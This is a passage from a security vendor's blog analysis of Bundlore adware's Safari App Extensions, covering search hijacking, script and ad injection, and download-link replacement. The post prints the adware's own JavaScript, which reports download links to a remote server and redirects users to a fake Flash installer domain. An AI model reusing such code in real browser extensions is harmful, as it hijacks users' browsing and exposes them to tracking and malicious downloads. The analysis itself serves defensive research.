<figure id="attachment_67233" aria-describedby="caption-attachment-67233" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2020/06/bundlore-install-screen.png"><img loading="lazy" class="wp-image-67233 size-large" src="https://news.sophos.com/wp-content/uploads/2020/06/bundlore-install-screen.png?w=640" alt="" width="640" height="342" srcset="https://news.sophos.com/wp-content/uploads/2020/06/bundlore-install-screen.png 1687w, https://news.sophos.com/wp-content/uploads/2020/06/bundlore-install-screen.png?resize=300,160 300w, https://news.sophos.com/wp-content/uploads/2020/06/bundlore-install-screen.png?resize=768,411 768w, https://news.sophos.com/wp-content/uploads/2020/06/bundlore-install-screen.png?resize=1024,548 1024w, https://news.sophos.com/wp-content/uploads/2020/06/bundlore-install-screen.png?resize=1536,821 1536w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-67233" class="wp-caption-text">The webtools.app installer launches, hiding everything else on the screen as it begins to attempt to install its payloads.</figcaption></figure>
<figure id="attachment_67237" aria-describedby="caption-attachment-67237" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2020/06/webtools-contents.png"><img loading="lazy" class="size-large wp-image-67237" src="https://news.sophos.com/wp-content/uploads/2020/06/webtools-contents.png?w=640" alt="" width="640" height="397" srcset="https://news.sophos.com/wp-content/uploads/2020/06/webtools-contents.png 781w, https://news.sophos.com/wp-content/uploads/2020/06/webtools-contents.png?resize=300,186 300w, https://news.sophos.com/wp-content/uploads/2020/06/webtools-contents.png?resize=768,477 768w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-67237" class="wp-caption-text">The contents of webtools.app&#8217;s bundle include a pile of unwanted adware and other PUAs.</figcaption></figure>
<p>Expanding the .safariextz file reveals it contains a Safari legacy extension called &#8220;MyCouponSmart.&#8221; And one of the archives, &#8220;mcs.zip,&#8221; contains an updated Safari App Extension version of MyCouponSmart:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2020/06/mycouponsmart-ext-contents.png"><img loading="lazy" class="alignnone size-large wp-image-67239" src="https://news.sophos.com/wp-content/uploads/2020/06/mycouponsmart-ext-contents.png?w=640" alt="" width="640" height="391" srcset="https://news.sophos.com/wp-content/uploads/2020/06/mycouponsmart-ext-contents.png 723w, https://news.sophos.com/wp-content/uploads/2020/06/mycouponsmart-ext-contents.png?resize=300,183 300w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>Another archive, &#8220;as.zip,&#8221; contains an installer called SearchMine.app, which in turn contains a Safari App Extension component named &#8220;AnySearch.&#8221;</p>
<figure id="attachment_67240" aria-describedby="caption-attachment-67240" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2020/06/searchmine-contents.png"><img loading="lazy" class="size-large wp-image-67240" src="https://news.sophos.com/wp-content/uploads/2020/06/searchmine-contents.png?w=640" alt="" width="640" height="419" srcset="https://news.sophos.com/wp-content/uploads/2020/06/searchmine-contents.png 647w, https://news.sophos.com/wp-content/uploads/2020/06/searchmine-contents.png?resize=300,197 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-67240" class="wp-caption-text">The SearchMine app&#8217;s contents include the AnySearch Safari App Extension.</figcaption></figure>
<p>&nbsp;</p>
<h3>The AnySearch.appex App Extension payload</h3>
<p>Safari App Extensions are a combination of JavaScript, Cascading Style Sheets (CSS), and native macOS code written in either Swift of Objective C. The native code can communicate with the JavaScript element through a message handler interface in the browser—so while the JavaScript is still running in the Safari sandbox, it can communicate with the native code running in macOS and respond to events and messages passed to it from the application.</p>
<p>The Bundlore installation chain attempts to install both the MyCouponSmart and the AnySearch browser extensions, in addition to other applications identified by Sophos as potentially unwanted applications. For targets with Safari 13, the legacy MyCouponSmart browser extension fails, so we&#8217;ll focus on the Safari App Extensions here.</p>
<p>Both extensions qualify as &#8220;adware,&#8221; injecting additional content and altering content of websites visited by the user. The MyCouponSmart app extension appears to have the same sort of functionality as its legacy version, with some minor changes made in an attempt to obscure its purpose. The SearchMine extension, called AnySearch, changes the default search engine and home page for the browser</p>
<p>Once installed, both extensions show up in Safari&#8217;s Preferences window under &#8220;Extensions&#8221;, as shown below:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2020/06/AnySearchExtension.png"><img loading="lazy" class="alignnone size-large wp-image-67104" src="https://news.sophos.com/wp-content/uploads/2020/06/AnySearchExtension.png?w=640" alt="" width="640" height="433" srcset="https://news.sophos.com/wp-content/uploads/2020/06/AnySearchExtension.png 1015w, https://news.sophos.com/wp-content/uploads/2020/06/AnySearchExtension.png?resize=300,203 300w, https://news.sophos.com/wp-content/uploads/2020/06/AnySearchExtension.png?resize=768,520 768w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>In addition to installing the AnySearch Safari extension, the SearchMine installer changes the default home page for Safari to its own web page, searchmine[.]net:<a style="font-size: 1em" href="https://news.sophos.com/wp-content/uploads/2020/06/SearchMine.png"><img loading="lazy" class="alignnone size-large wp-image-67108" src="https://news.sophos.com/wp-content/uploads/2020/06/SearchMine.png?w=640" alt="" width="640" height="435" srcset="https://news.sophos.com/wp-content/uploads/2020/06/SearchMine.png 1017w, https://news.sophos.com/wp-content/uploads/2020/06/SearchMine.png?resize=300,204 300w, https://news.sophos.com/wp-content/uploads/2020/06/SearchMine.png?resize=768,522 768w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>When the AnySearch Extension is enabled, it goes further than just a homepage change—searches directed at any other search engine site get redirected. For example, a Google search entered in the address bar after we installed the sample got redirected through another URL, eventually resulting in  a Bing search result.</p>
<p>Probing the contents of the AnySearch.appex package sheds some light on what&#8217;s happening, let&#8217;s take look into the inner details to find out what is happening. First, the &#8220;Info.plist&#8221; file within the inner &#8220;AnySearch.appex&#8221; package tells us about basic configuration of this App Extension. The relevant part looks like this:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2020/06/anysearch-info.png"><img loading="lazy" class="alignnone size-large wp-image-67271" src="https://news.sophos.com/wp-content/uploads/2020/06/anysearch-info.png?w=640" alt="" width="640" height="397" srcset="https://news.sophos.com/wp-content/uploads/2020/06/anysearch-info.png 758w, https://news.sophos.com/wp-content/uploads/2020/06/anysearch-info.png?resize=300,186 300w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>&nbsp;</p>
<p>Safari Extension Property List Keys are <a href="https://developer.apple.com/documentation/safariservices/safari_app_extensions/safari_app_extension_info_property_list_keys">explained here in Apple documentation</a>. The key &#8220;SFSafariContentScript&#8221; indicates that &#8220;script.js&#8221; as the JavaScript code that gets injected into webpages, and contents of key &#8220;SFSafariWebsiteAccess&#8221; shows that this injection is targeted at common search engine domains. This information matches that of the Safari Extensions screenshot above.</p>
<p>When we turn to the content of &#8220;script.js&#8221; script to see what exactly is being injected, we see the code is obfuscated using hex codes and arrays of strings, as shown below:</p>
<figure id="attachment_67244" aria-describedby="caption-attachment-67244" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2020/06/AnySearch-obfuscated.png"><img loading="lazy" class="size-large wp-image-67244" src="https://news.sophos.com/wp-content/uploads/2020/06/AnySearch-obfuscated.png?w=640" alt="" width="640" height="292" srcset="https://news.sophos.com/wp-content/uploads/2020/06/AnySearch-obfuscated.png 921w, https://news.sophos.com/wp-content/uploads/2020/06/AnySearch-obfuscated.png?resize=300,137 300w, https://news.sophos.com/wp-content/uploads/2020/06/AnySearch-obfuscated.png?resize=768,350 768w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-67244" class="wp-caption-text">The obfuscated AnySearch JavaScript.</figcaption></figure>
<p>When we de-obfuscate the code, it looks like this:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2020/06/anysearch_deobfuscated.png"><img loading="lazy" class="alignnone wp-image-67272 size-large" src="https://news.sophos.com/wp-content/uploads/2020/06/anysearch_deobfuscated.png?w=549" alt="" width="549" height="786" srcset="https://news.sophos.com/wp-content/uploads/2020/06/anysearch_deobfuscated.png 549w, https://news.sophos.com/wp-content/uploads/2020/06/anysearch_deobfuscated.png?resize=210,300 210w" sizes="(max-width: 549px) 100vw, 549px" /></a></p>
<p>We can see here that the script strips the search parameters out of queries to Yahoo and Bing, and then passes them back to the native code of the plug-in—which then forwards the search to searchmine[.]net.  Searchmine.net forwards on the searches with affiliate tags back to Bing to get credit for forwarding them. It&#8217;s a very basic form of content injection that doesn&#8217;t require modification of the targeted sites themselves.</p>
<h3> The MyCouponSmart app extension</h3>
<p>The MyCouponSmart extension is less visible to the user after it&#8217;s installed in Safari, but is in fact more insidious.  In its info.plist file, the extension&#8217;s website access is set to &#8220;All&#8221;—meaning it can touch any website visited with the browser.</p>
<p>This extension&#8217;s script.js uses the same type of JavaScript obfuscation as the AnySearch extension&#8217;s.  Deobfuscating the script reveals two functions; the first , &#8221; add_pre_js,&#8221; checks characteristics of the web page being opened, adds information from the page being loaded and the extension&#8217;s native code to a JSON object, and then sends the JSON object to the server (secure.mycouponsmart.com) as part of a web request.</p>
<figure id="attachment_67242" aria-describedby="caption-attachment-67242" style="width: 640px" class="wp-caption alignnone"><a style="font-size: 1em" href="https://news.sophos.com/wp-content/uploads/2020/06/mycouponsmart_add_pre_js.png"><img loading="lazy" class="wp-image-67242 size-large" src="https://news.sophos.com/wp-content/uploads/2020/06/mycouponsmart_add_pre_js.png?w=640" alt="" width="640" height="434" srcset="https://news.sophos.com/wp-content/uploads/2020/06/mycouponsmart_add_pre_js.png 846w, https://news.sophos.com/wp-content/uploads/2020/06/mycouponsmart_add_pre_js.png?resize=300,204 300w, https://news.sophos.com/wp-content/uploads/2020/06/mycouponsmart_add_pre_js.png?resize=768,521 768w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-67242" class="wp-caption-text">The MyCouponSmart extension&#8217;s built-in JavaScript builds a web request to send to a supporting server.</figcaption></figure>
<p>The second function, add_content, takes the response from the remote server—a block of JavaScript code—and adds it to the header of the loading web page as a &#8220;script&#8221; element, so that it will be executed by Safari as part of the page. Since this is done by the extension, it will not trigger warnings about cross-site content or the security of the page itself.</p>
<figure id="attachment_67241" aria-describedby="caption-attachment-67241" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2020/06/MyCouponSmart_add_content.png"><img loading="lazy" class="wp-image-67241 size-large" src="https://news.sophos.com/wp-content/uploads/2020/06/MyCouponSmart_add_content.png?w=640" alt="" width="640" height="401" srcset="https://news.sophos.com/wp-content/uploads/2020/06/MyCouponSmart_add_content.png 856w, https://news.sophos.com/wp-content/uploads/2020/06/MyCouponSmart_add_content.png?resize=300,188 300w, https://news.sophos.com/wp-content/uploads/2020/06/MyCouponSmart_add_content.png?resize=768,481 768w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-67241" class="wp-caption-text">The response code gets injected.</figcaption></figure>
<h3>Site detection and ad injection</h3>
<p>Among the first thing the code does is to check if the browser is opening a page from Microsoft&#8217;s Bing search engine; if the page is at www.bing.com, the code injects an IFRAME into the page :<a href="https://news.sophos.com/wp-content/uploads/2020/06/Bundlore-bing-iframe.png"><img loading="lazy" class="alignnone size-large wp-image-67197" src="https://news.sophos.com/wp-content/uploads/2020/06/Bundlore-bing-iframe.png?w=640" alt="" width="640" height="120" srcset="https://news.sophos.com/wp-content/uploads/2020/06/Bundlore-bing-iframe.png 682w, https://news.sophos.com/wp-content/uploads/2020/06/Bundlore-bing-iframe.png?resize=300,56 300w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p><span style="font-size: 1em">There are a significant number of lines of the script dedicated to checking </span>if the webpage is on a list of sites that don&#8217;t get injected with ads, starting with the adware developers&#8217; &#8220;search page and search feed affiliates&#8221; and including sites associated with the adware campaigns themselves:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2020/06/bundlore_affiliates_noinject.png"><img loading="lazy" class="alignnone size-large wp-image-67199" src="https://news.sophos.com/wp-content/uploads/2020/06/bundlore_affiliates_noinject.png?w=640" alt="" width="640" height="576" srcset="https://news.sophos.com/wp-content/uploads/2020/06/bundlore_affiliates_noinject.png 669w, https://news.sophos.com/wp-content/uploads/2020/06/bundlore_affiliates_noinject.png?resize=300,270 300w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>There is also a set of pattern checks for URLs associated with their customers&#8217; payloads and some of the affiliate codes or other URL patterns associated with their campaigns on Bing, Yahoo and other sites—so that injected ads don&#8217;t cut into affiliates&#8217; other revenue streams. And, thoughtfully, the MyCouponSmart operators have also added the Apple Safari Extensions page to the list sites to be left alone.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2020/06/bundlore_affilliate_tags_Yahoo.png"><img loading="lazy" class="alignnone size-large wp-image-67200" src="https://news.sophos.com/wp-content/uploads/2020/06/bundlore_affilliate_tags_Yahoo.png?w=640" alt="" width="640" height="264" srcset="https://news.sophos.com/wp-content/uploads/2020/06/bundlore_affilliate_tags_Yahoo.png 675w, https://news.sophos.com/wp-content/uploads/2020/06/bundlore_affilliate_tags_Yahoo.png?resize=300,124 300w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>There&#8217;s a final, somewhat random bit of code that determines whether to exclude the page from content injection: if the page is on the domains of Google or Facebook, the script uses a random function called &#8220;randomChance&#8221; to determine whether or not to inject ads.  Walking through the DOM of the targeted page, it also checks to see if there are specifically targeted components of the page that the developer has targeted before excluding the page from content injection:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2020/06/should-exclude.png"><img loading="lazy" class="alignnone size-large wp-image-67270" src="https://news.sophos.com/wp-content/uploads/2020/06/should-exclude.png?w=640" alt="" width="640" height="139" srcset="https://news.sophos.com/wp-content/uploads/2020/06/should-exclude.png 732w, https://news.sophos.com/wp-content/uploads/2020/06/should-exclude.png?resize=300,65 300w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>&nbsp;</p>
<p>If the loaded web page is just standard content, and if the loaded page doesn&#8217;t meet any of the exclusions cut out by the rules above, the remote script then gets around to injecting more content into the body of the targeted page.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2020/06/ad-insertion-1.png"><img loading="lazy" class="alignnone size-large wp-image-67275" src="https://news.sophos.com/wp-content/uploads/2020/06/ad-insertion-1.png?w=640" alt="" width="640" height="120" srcset="https://news.sophos.com/wp-content/uploads/2020/06/ad-insertion-1.png 737w, https://news.sophos.com/wp-content/uploads/2020/06/ad-insertion-1.png?resize=300,56 300w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>There&#8217;s another type of injection for a special subset of pages. If the name of the Safari &#8220;window&#8221; (the name associated with the browser tab or window that is opened when the script fires off) matches a specific pattern defined in a regular expression,  it defines the source of ad content as a script cached on the Akamai content delivery network.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2020/06/akamai-scriptget.png"><img loading="lazy" class="alignnone size-large wp-image-67269" src="https://news.sophos.com/wp-content/uploads/2020/06/akamai-scriptget.png?w=640" alt="" width="640" height="101" srcset="https://news.sophos.com/wp-content/uploads/2020/06/akamai-scriptget.png 738w, https://news.sophos.com/wp-content/uploads/2020/06/akamai-scriptget.png?resize=300,47 300w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<h3>Search replacement</h3>
<p>Yahoo and Bing get special treatment for content replacement—like the AnySearch extension,  this extension can also hijack search queries from these sites.  If the page being loaded is a Bing search, the code in the function below parses out the search query from the Bing URL, and replaces it with the URL of a site with an API connection to Bing—presumably to earn the site search affiliate rewards.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2020/06/bing-replacement.png"><img loading="lazy" class="alignnone size-large wp-image-67204" src="https://news.sophos.com/wp-content/uploads/2020/06/bing-replacement.png?w=640" alt="" width="640" height="336" srcset="https://news.sophos.com/wp-content/uploads/2020/06/bing-replacement.png 659w, https://news.sophos.com/wp-content/uploads/2020/06/bing-replacement.png?resize=300,158 300w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>Yahoo searches get similar treatment.  The URL is parsed, and the query is pulled from it. However, in this case, information about the search is sent back to the remote MyCouponSmart server. All searches are logged remotely with an identifier for the Mac they were sent from and a timestamp.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2020/06/yahoo-search-hijack.png"><img loading="lazy" class="alignnone size-large wp-image-67276" src="https://news.sophos.com/wp-content/uploads/2020/06/yahoo-search-hijack.png?w=640" alt="" width="640" height="395" srcset="https://news.sophos.com/wp-content/uploads/2020/06/yahoo-search-hijack.png 711w, https://news.sophos.com/wp-content/uploads/2020/06/yahoo-search-hijack.png?resize=300,185 300w" sizes="(max-width: 640px) 100vw, 640px" /></a>When the remote server responds, the search is forwarded to the same server as Bing searches, with a &#8220;subId&#8221; that identifies the source of the search.</p>
<h3>Download link replacement</h3>
<p>Another feature of MyCouponSmart&#8217;s remote script that stood out was that it contained code that searches for file download links in web pages—and then replaces them with a URL  of the developers&#8217; choosing. The beginning of the code shows some of the pattern checks, including deliberately avoiding download links on Adobe&#8217;s website, Google or Facebook (or the distribution points for the adware, for that matter).</p>
<h3><a href="https://news.sophos.com/wp-content/uploads/2020/06/dldetect-script.png"><img loading="lazy" class="alignnone size-large wp-image-67278" src="https://news.sophos.com/wp-content/uploads/2020/06/dldetect-script.png?w=640" alt="" width="640" height="562" srcset="https://news.sophos.com/wp-content/uploads/2020/06/dldetect-script.png 661w, https://news.sophos.com/wp-content/uploads/2020/06/dldetect-script.png?resize=300,263 300w" sizes="(max-width: 640px) 100vw, 640px" /></a></h3>
<p>The link replacement part of the code apparently changes regularly. When we first examined it, the script was simply replacing download links with links on Yahoo:</p>
<pre>s.src = '//events.securesrv12.com/report/dldetect/?pop=1&amp;links=' + removedLinks + '&amp;iteration=' + admgr.reportIteration;
document.head.appendChild( s );
window.location.replace("http://www.yahoo.com");</pre>
<p>However, a later version of this script  we observed  was updated with more detection features and a  different redirect URL. The updated version replaced  download links with a URL pointing to a fake Flash installer download page. The same script is apparently also being used to target Google Chrome browsers, as it provided a different domain if Chrome was detected as the browser type.</p>
<pre>var s = document.createElement( 'script' );
s.src = '//events.securesrv12.com/report/dldetect/?pop=1&amp;links=' + removedLinks + '&amp;iteration=' + admgr.reportIteration;
document.head.appendChild( s );
var domain = "hcadxhvenu.alfonsopardon.com";
if (navigator.userAgent.toLowerCase().indexOf('chrome') != -1 || window.chrome) {
domain = "zjhvvrof.baboonconsul.com";
}
window.location.replace("http://" + domain + "/pr/?ci=8341&amp;line_item=2&amp;subid=" + Date.now());
}</pre>
<figure id="attachment_67279" aria-describedby="caption-attachment-67279" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2020/06/safari_fake_flash.png"><img loading="lazy" class="wp-image-67279 size-large" src="https://news.sophos.com/wp-content/uploads/2020/06/safari_fake_flash.png?w=640" alt="" width="640" height="276" srcset="https://news.sophos.com/wp-content/uploads/2020/06/safari_fake_flash.png 1323w, https://news.sophos.com/wp-content/uploads/2020/06/safari_fake_flash.png?resize=300,129 300w, https://news.sophos.com/wp-content/uploads/2020/06/safari_fake_flash.png?resize=768,331 768w, https://news.sophos.com/wp-content/uploads/2020/06/safari_fake_flash.png?resize=1024,442 1024w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-67279" class="wp-caption-text">The fake Adobe Flash update page presented to Safari users by the script.</figcaption></figure>
<p>The Safari destination for the fake Flash downloader remains in the most recent version of the script we checked; the domain for Chrome redirection had changed again, but like the previous Chrome redirect was unreachable.</p>
<h3>Conclusions</h3>
<p>Based on these and other samples we&#8217;ve observed, it&#8217;s clear that adware developers are clearly embracing the transition to Safari App Extension format and are updating their payload scripts. Browser extensions are increasingly popular as applications move to the cloud, and web browsers become the most heavily-used component of operating systems. So they will correspondingly continue to be a target for scams such as adware.</p>
<p>It&#8217;s also clear that adware operators are diversifying their sources of revenue. As demonstrated by the download link replacement behavior of these scripts, adware operators are finding new ways to leverage their control over web browsers&#8217; content—and the result could be new privacy and security risks.</p>
<p>While Sophos blocks Bundlore installers, their developers and developers like them are continuously trying to find ways to bypass PUA blocks. Users should exercise caution when downloading software from unknown sources and stay alert when unfamiliar app tries to install Browser Extensions.</p>
<p>&nbsp;</p>
			</div><!-- .entry-content -->

</article><!-- #post-## -->

					<nav class="navigation post-navigation" role="navigation">
			<h2 class="screen-reader-text">Post navigation</h2>
			<div class="nav-links">
	   			<div class="nav-previous">
											<span class="nav-label">Prev</span>
						<a href="https://news.sophos.com/en-us/2020/06/12/sophos-connect-2-0-early-access-program-is-now-available/" rel="prev">Sophos Connect 2.0 Early Access Program is now available!</a>
						   			</div>
	   			<div class="nav-next">
											<span class="nav-label">Next</span>
						<a href="https://news.sophos.com/en-us/2020/06/23/how-to-upgrade-to-xg-firewall-v18/" rel="next">How to upgrade to XG Firewall v18</a>
						   			</div>
		 	</div><!-- .nav-links -->
		</nav><!-- .navigation -->
		
			<div class="article-author-block article-co-authors-block">
	
					<h2 class="author-title">
				About the Authors			</h2>
		
					<div class="author-block-container">
				<div class="author-profile">
					<img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' class='avatar avatar-145 photo avatar-default' height='145' width='145' />				</div> <!-- .author-profile -->

				<div class="author-description">
					<h3 class="author-name"><a href="https://news.sophos.com/en-us/author/xinran-wu/" title="Posts by Xinran Wu" class="author url fn" rel="author">Xinran Wu</a></h3>

					
					<div class="author-bio">
						<p>Xinran has 11 years of experience analyzing and reversing malware of various platforms such as Windows, Android and macOS.
His current focus is macOS/iOS malware and potentially unwanted software.</p>
					</div> <!-- .author-bio -->
				</div> <!-- .author-description -->
			</div> <!-- .author-block-container -->
					<div class="author-block-container">
				<div class="author-profile">
					<img width="145" height="145" src="https://news.sophos.com/wp-content/uploads/2020/02/sean-gallagher.jpg?w=145" class="avatar avatar-145 photo wp-post-image" alt="Sean Gallagher" />				</div> <!-- .author-profile -->

				<div class="author-description">
					<h3 class="author-name"><a href="https://news.sophos.com/en-us/author/sean-gallagher/" title="Posts by Sean Gallagher" class="author url fn" rel="author">Sean Gallagher</a></h3>

					
					<div class="author-bio">
						<p>Sean Gallagher is a Senior Threat Researcher at Sophos. </p>
<p>Previously, Gallagher was IT and National Security Editor at Ars Technica, where he focused on information security and digital privacy issues, cybercrime, cyber espionage and cyber warfare. He has been a security researcher, technology journalist and information technology practitioner for over 20 years.</p>
					</div> <!-- .author-bio -->
				</div> <!-- .author-description -->
			</div> <!-- .author-block-container -->
			</div>

			
<div id="comments" class="comments-area">

	
	
	
		<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/en-us/2020/06/18/new-bundlore-adware-targets-macos-with-updated-safari-extensions/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://news.sophos.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span></p><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name</label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" /></p>
<p class="comment-form-email"><label for="email">Email</label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" /></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
<input type="hidden" name="redirect_to" value="https://news.sophos.com/en-us/2020/06/18/new-bundlore-adware-targets-macos-with-updated-safari-extensions/" id="redirect_to"><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='66075' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="97d1aa4a4f" /></p><input type="hidden" id="ak_js" name="ak_js" value="224"/><textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100" style="display: none !important;"></textarea></form>	</div><!-- #respond -->
	
</div><!-- #comments -->

		
		</main><!-- #main -->
	</div><!-- #primary -->


<div id="secondary" class="widget-area" role="complementary">
			
		<div id="second-article-wrapper" class="article-wrapper">
			<h3 class="widget-title">You might also enjoy...</h3>
			<article id="post-72266" class="second-featured post-72266 post type-post status-publish format-standard has-post-thumbnail hentry category-mtr category-security-operations tag-mtr tag-ransomware tag-sidebar tag-sophos-managed-threat-response-mtr tag-sophos-mtr region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">03</span>
				<span class="month">Feb</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/mtr/">MTR</a> &bull; <a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/" rel="bookmark">MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-72321" class="second-featured post-72321 post type-post status-publish format-standard has-post-thumbnail hentry category-products tag-sidebar tag-zero-trust tag-ztna region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2021/02/ZTNA-header.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">02</span>
				<span class="month">Feb</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/products/">Sophos Products</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2021/02/02/sophos-zero-trust-network-access-ztna-is-coming-soon/" rel="bookmark">Sophos zero trust network access (ZTNA) is coming soon</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-72021" class="second-featured post-72021 post type-post status-publish format-standard has-post-thumbnail hentry category-products tag-mtr tag-rapid-response tag-sidebar tag-sophos-mtr tag-sophos-rapid-response region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v1.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">19</span>
				<span class="month">Jan</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/products/">Sophos Products</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2021/01/19/451-research-impact-report-on-sophos-rapid-response-service/" rel="bookmark">451 Research Impact Report on Sophos Rapid Response service</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-71626" class="second-featured post-71626 post type-post status-publish format-standard has-post-thumbnail hentry category-products tag-edr tag-intercept-x-advanced-for-server-with-edr tag-intercept-x-with-edr tag-live-discover tag-sidebar region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/12/APIs-hero.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">17</span>
				<span class="month">Dec</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/products/">Sophos Products</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2020/12/17/sophos-edr-live-discover-apis-are-now-generally-available/" rel="bookmark">Sophos EDR Live Discover APIs are now generally available</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
		</div>

	</div> <!-- #secondary -->


		</div> <!-- .container -->
	</div> <!-- #content -->
	<footer>
		<section class="cta">
			<p>Start a Sophos demo in less than a minute. See exactly how our solutions work in a full environment without a commitment.</p>
			<a href="https://secure2.sophos.com/en-us/products/demos.aspx?cmp=70130000001xKqzAAE">Learn More</a>
		</section>
		<section class="connected">
			<div class="social">
				<h3>Stay Connected</h3>
				<ul>
					<li><a href="https://www.facebook.com/securitybysophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/facebook-icon.svg?la=en&amp;hash=1CA0A5A0E9C9999E7E079A5D32C86E9BF9C7AD1E" alt="Facebook"></a>
					</li>
					<li><a href="https://www.instagram.com/sophossecurity/" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/instagram-icon.svg?la=en&amp;hash=2B50C2B67C3023D9E7D4E1C3A16401EAD8F10F76" alt="Instagram"></a>
					</li>
					<li><a href="https://www.linkedin.com/company/sophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/linkedin-icon.svg?la=en&amp;hash=B6D5378C1E1A16F239A4C862EAE3499B8EC1F3F9" alt="LinkedIn"></a></li>
